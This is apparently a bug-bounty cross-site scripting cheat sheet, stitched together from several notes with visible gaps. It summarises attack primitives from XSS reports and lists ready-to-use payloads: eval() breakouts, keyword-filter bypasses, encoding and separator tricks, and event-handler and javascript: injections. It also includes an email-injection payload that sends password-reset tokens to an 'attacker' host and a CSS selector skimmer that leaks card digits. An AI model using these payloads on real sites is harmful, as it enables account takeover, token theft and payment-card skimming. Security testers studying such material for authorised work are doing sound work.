...
## MDPsec Verified Patterns (10 real XSS reports)

Real-world primitives from mdpsec.com reports:

1. **UI blocks, API accepts** — upload UI rejects SVG client-side only; direct API call (or JSON-body data-URI upload `{"attachment":{"file":"data:image/svg+xml;base64,..."}}`) accepts it (6, 7). Always bypass the frontend restriction and hit the API directly.
2. **SVG served on dashboard origin as `image/svg+xml` with no CSP** → `<script>` executes as top-level document; `<object data="/attachments/{id}" type="image/svg+xml">` in report description = zero-click for anyone opening the report (6, 7).
3. **`eval()` sink in styling/page-builder JS** — style variables stored plaintext in generated CSS file, read back and fed into `eval('applyStyles({' + params + '})')`; payload `" '})+eval(String.fromCharCode(...))//"` closes call early, appends JS, comments out rest — fires next time admin opens panel, attacker need not be online (16).
4. **Unauth base class inheritance** — CMS plugin controller inherits public API base class with no authorization attribute → every action reachable with zero credentials; font-lookup action triggered outbound request = server-side execution proof (16).
5. **Presigned upload Content-Type not covered by signature** — signature covers only request host → upload HTML/SVG to image key with `Content-Type: text/html`; CDN honors it; no nosniff/CSP → executes on first-party origin (39, 83). GraphQL `input.type` written verbatim into S3 policy `["eq","$Content-Type",...]` — no allowlist (83).
6. **ACAO reflection + credentials on subdomains** — data API reflects any subdomain of parent into `Access-Control-Allow-Origin` with `allow-credentials: true`; content-origin page makes authenticated requests cross-origin and reads responses (39).
7. **Password reset redirect-after-reset injection** — `redirectAfterReset` stored verbatim in email reset link; WAF blocks `script`/`javascript:` but bypass via string concatenation `"on"+"load"` + alternate constructor; payload reads plaintext password from still-mounted form + session tokens (72).
8. **HTML injection into reset emails — zero-click token exfil** — client-supplied `resetPasswordLink` interpolated unencoded into href; `"><img src="https://attacker/?token={0}">` — server substitutes real token; exfils on email OPEN (image proxies auto-load) (79).
9. **CSS injection skimmer inside payment form** — origin check short-circuited by hardcoded flag + no frame-ancestors → iframe genuine card form; init message `}` closes style rule; card digits reflected into `value` attribute → CSS attribute-selector exfil `input#card-number[value^="4000 0"] { background-image: url(attacker/leak/40005); }` (80).
10. **Unanchored allowlist script load** — leftover test param loads script from host that merely CONTAINS pattern as substring; clone form renders in genuine origin (100).
11. **Stored XSS via consent-vendor supply chain** — third-party banner renders config via `shadowRoot.innerHTML += settingsMarkup` unsanitized; vendor management API write+publish no auth (2 unauthenticated PUTs); CSP has unsafe-inline (116).
12. **WAF-bypass concat trick (72):** `\" onload=\"...` + `\"on\"+\"load\"` method-name concatenation and alternate constructor syntax defeats keyword filters.
...
**Source:** document.location.hash, window.name, Ajax, cookies, localStorage
**Sink:** eval(), innerHTML, document.write, location.href, element.src



## XSS — Inside Tag

**Event Handler:** `');alert(origin);//` → `&#39;);alert(origin);//`
**src attribute:** Try remote JS, if whitelisted try bypass
**srcdoc:** `&lt;svg/onload=alert(origin)&gt;`

**Context break:** `"` `%22` `&quot;` `'` `%27` `&#39;`



## a13h1 Medium Writeups — XSS (2 articles, ~$866)
- **$366 Reflected XSS in Parser Endpoint** — Reflected XSS in Parser service of SaaS automation platform
- **$500 Surprise XSS** — Unexpected XSS discovery in web application

## Encoding Basics

**HTML Encoding:** `&#x61;` = a, `&#97;` = a
**Character refs:** `&lt;` `<`, `&gt;` `>`, `&quot;` `"`, `&amp;` `&`
**Unicode JS:** `\u0061` = a
**URL Encode:** `%61` = a, double encode: `%2561`

**Golden Tips:**
- Browser auto HTML-decodes attributes
- Browser parses unicode in JS
- Browser does NOT parse encoded HTML tags



## XSS — Outside Tag

**Executable (HTML tag parsed):**
```
<img/src/onerror=alert(origin)>
<a href="&#x64;avascript&#x3a;alert(origin)">test</a>
```

**Separators:** space, `/`, `%0a`, `%0d`, `%09`, `~`

**Non-Executable (safe):** `<style>`, `<title>`, `<template>`, `<noscript>`, `<textarea>`

**Break non-executable:**
```
</tag> </tAg/x> </tag>%0a </tag>%09
```



## Encoding & Bypass Quick Reference (from xss-testing-methodology)
...
```
';alert(origin);// </script><svg/onload=alert(1)>
```

**Without break:** `location.replace("$input")` → use tab:
```
javascript:alert(1) javascr%09ipt:\u0061lert(1)
```
...
- New HTML tags: `<details/open/ontoggle=JS>`
- After `#`: `<details/open/ontoggle="location=location.hash.split('#')[1]">#javascript:alert(XSS)`
- Expand payload: `<img src="_=_" title="onerror='prompt(1)'">`
- Unicode alternatives: `\u(0061)`, `&#0000040;`


---
# Merged from: xss-testing-methodology
